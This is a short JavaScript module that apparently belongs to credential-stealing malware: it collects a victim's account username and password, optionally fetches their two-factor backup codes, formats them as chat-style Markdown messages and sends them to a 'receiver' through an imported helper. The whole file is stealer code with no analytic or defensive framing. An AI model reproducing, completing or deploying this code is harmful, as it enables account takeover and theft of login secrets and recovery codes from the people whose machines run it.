import { getAccountCredentials } from './getAccountCredentials';
import { sendDataToReceiver } from './sendDataToReceiver';
import { getBackupCodes } from './getBackupCodes';

export const sendAccountInfo = ({ tryGetBackupCodes = false }) =>
	getAccountCredentials()
		.then((accountCredentials) => {
			const { username, password } = accountCredentials;

			if (!username && !password) return;

			const promises = [
				sendDataToReceiver({
					context: 'account_credentials',
					message:
						'\n-- **Account Credentials** --\n\n' +
						(username ? `- Username: \`${username || ' '}\`\n` : '') +
						(password ? `- Password: \`${password || ' '}\`\n` : ''),
					json: JSON.stringify(accountCredentials),
				}),
			];

			if (tryGetBackupCodes) {
				promises.push(
					getBackupCodes(accountCredentials).then(({ backupCodes }) => {
						if (!backupCodes) return;

						return sendDataToReceiver({
							context: 'backup_codes',
							message: '\n-- **Backup Codes** --\n\n' + `\`\`\`\n${backupCodes}\n\`\`\``,
							text: backupCodes,
						});
					})
				);
			}

			return Promise.all(promises);
		})
		.then(() => undefined);
